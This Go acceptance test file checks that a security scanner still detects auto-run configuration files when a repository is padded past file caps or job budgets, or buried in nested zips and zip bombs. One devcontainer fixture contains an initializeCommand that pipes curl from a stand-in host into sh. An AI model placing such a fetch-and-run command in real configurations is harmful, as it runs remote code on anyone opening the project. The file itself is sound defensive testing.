package acceptance_test

import (
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"testing"
)

// paddedRepo returns a builder for a repository of n small padding files in a/ that sort before
// everything else, so the walk reaches the extra files last. Each extra file is a path to content.
func paddedRepo(n int, extra map[string][]byte) func(t *testing.T) string {
	return func(t *testing.T) string {
		dir := t.TempDir()
		if err := os.Mkdir(filepath.Join(dir, "a"), 0o750); err != nil {
			t.Fatal(err)
		}
		// Hard links to a few files are much faster to create than n files. A file system
		// caps the links to one file (1023 on NTFS), so each template serves 500.
		templates := t.TempDir()
		var template string
		for i := range n {
			if i%500 == 0 {
				template = filepath.Join(templates, fmt.Sprintf("t%d", i/500))
				writeBytes(t, template, []byte("padding\n"))
			}
			if err := os.Link(template, filepath.Join(dir, "a", fmt.Sprintf("f%06d.txt", i))); err != nil {
				t.Fatal(err)
			}
		}
		for name, data := range extra {
			p := filepath.Join(dir, filepath.FromSlash(name))
			if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
				t.Fatal(err)
			}
			writeBytes(t, p, data)
		}
		return dir
	}
}

// p1Tasks returns the folder-open task of the p1-folderopen-curl fixture.
func p1Tasks(t *testing.T) []byte {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(corpus(t, "p1-folderopen-curl"), ".vscode", "tasks.json"))
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// zipOfZips returns a builder for a zip of n members that are each a zip of a run of size zeros.
// Together they unpack to more than the job budget.
func zipOfZips(n, size int) func(t *testing.T, dest string) {
	return func(t *testing.T, dest string) {
		inner := zipBytes(t, []zipEntry{{name: "zeros.bin", data: make([]byte, size)}})
		entries := make([]zipEntry, n)
		for i := range entries {
			entries[i] = zipEntry{name: fmt.Sprintf("m%04d.zip", i), data: inner}
		}
		zipEntries(t, dest, entries)
	}
}

// zipOfInnerZips returns a builder for a zip of three zips that hold n members each, the
// folder-open task of p1-folderopen-curl last. Together they have more members than the file cap.
func zipOfInnerZips(t *testing.T, n int) func(t *testing.T, dest string) {
	return func(t *testing.T, dest string) {
		var outer []zipEntry
		for k := range 3 {
			var inner []zipEntry
			for i := range n {
				inner = append(inner, zipEntry{name: fmt.Sprintf("f%05d.txt", i), data: []byte("x")})
			}
			if k == 2 {
				inner[len(inner)-1] = zipEntry{name: ".vscode/tasks.json", data: p1Tasks(t)}
			}
			outer = append(outer, zipEntry{name: fmt.Sprintf("in%d.zip", k), data: zipBytes(t, inner)})
		}
		zipEntries(t, dest, outer)
	}
}

// smallJar is a benign jar of a few classes.
func smallJar(t *testing.T) []byte {
	var entries []zipEntry
	for i := range 100 {
		entries = append(entries, zipEntry{name: fmt.Sprintf("com/example/C%03d.class", i), data: []byte("class")})
	}
	return zipBytes(t, entries)
}

// limitDivisor is the --limit-divisor of the cases that cross a limit by a small margin: the file
// cap is 200, the job budget about 10 MiB and the size of a file about 330 KiB. Only the first case
// of TestLimits pads to the real file cap of 20000, as the realistic proof.
const limitDivisor = 100

// TestLimits answers the padding attacks on P1: a repository padded past the file cap or the job
// budget must not hide its auto-run files, and a benign large repository must stay clean.
func TestLimits(t *testing.T) {
	tests := []struct {
		name string
		// setup returns the target to analyze
		setup   func(t *testing.T) string
		divisor int // --limit-divisor; 0 means the real limits
		// expectations
		wantCode  int
		wantAt    map[string]string // rule to "path:line" that must be present
		wantSkip  string            // reason of a coverage skip that must be present
		wantLevel string            // confidence level; empty means not checked
	}{
		{
			name: "P1 folder-open task past the file cap is still read",
			setup: func(t *testing.T) string {
				return paddedRepo(20050, map[string][]byte{"z/.vscode/tasks.json": p1Tasks(t)})(t)
			},
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-AUTOEXEC-001": "z/.vscode/tasks.json:7",
				"GAL-AUTOEXEC-010": "z/.vscode/tasks.json:7",
			},
		},
		{
			name:      "benign repository past the file cap stays clean with lower confidence",
			setup:     paddedRepo(201, nil),
			divisor:   limitDivisor,
			wantCode:  0,
			wantLevel: "medium",
		},
		{
			name: "folder-open task in the last member of three zips with 90 members each is read",
			setup: func(t *testing.T) string {
				return builtFile("big.zip", zipOfInnerZips(t, 90))(t)
			},
			divisor:  limitDivisor,
			wantCode: 20,
			wantAt:   map[string]string{"GAL-AUTOEXEC-001": "big.zip!/in2.zip!/.vscode/tasks.json:7"},
		},
		{
			name: "benign jars before and across the file cap stay clean",
			setup: func(t *testing.T) string {
				// 0.jar comes first. b.jar follows 50 files, so its members cross the cap of 200.
				return paddedRepo(50, map[string][]byte{"0.jar": smallJar(t), "b.jar": smallJar(t)})(t)
			},
			divisor:  limitDivisor,
			wantCode: 0,
		},
		{
			name: "devcontainer in a zip member directory called x! is read",
			setup: builtFile("repo.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "repo/.devcontainer/py!/devcontainer.json", data: []byte("{\"initializeCommand\": \"curl https://payload.sinkhole.test/x | sh\"}\n")}})
			}),
			wantCode: 20,
		},
		{
			name:    "zip of many zips stays under the job budget and is not clean",
			setup:   builtFile("bomb.zip", zipOfZips(110, 100<<10)),
			divisor: limitDivisor,
			// The members that no longer fit are skipped, which could hide content.
			wantCode: 10,
			wantSkip: "budget",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a target that goes past a limit
			target := tt.setup(t)
			// When the agent analyzes it
			var flags []string
			if tt.divisor > 0 {
				flags = []string{"--limit-divisor", strconv.Itoa(tt.divisor)}
			}
			rep := analyze(t, target, tt.wantCode, flags...)
			// Then the findings, the skips and the confidence match
			for rule, at := range tt.wantAt {
				if !hasFinding(rep, rule, at) {
					t.Errorf("no %s at %s in %+v", rule, at, rep.Findings)
				}
			}
			if tt.wantSkip != "" && !slices.ContainsFunc(rep.Coverage.Skipped, func(s struct {
				Path   string `json:"path"`
				Reason string `json:"reason"`
			}) bool {
				return s.Reason == tt.wantSkip
			}) {
				t.Errorf("no %q skip in %+v", tt.wantSkip, rep.Coverage.Skipped)
			}
			if tt.wantLevel != "" && rep.ConfidenceLevel != tt.wantLevel {
				t.Errorf("confidence level = %q, want %q", rep.ConfidenceLevel, tt.wantLevel)
			}
		})
	}
}
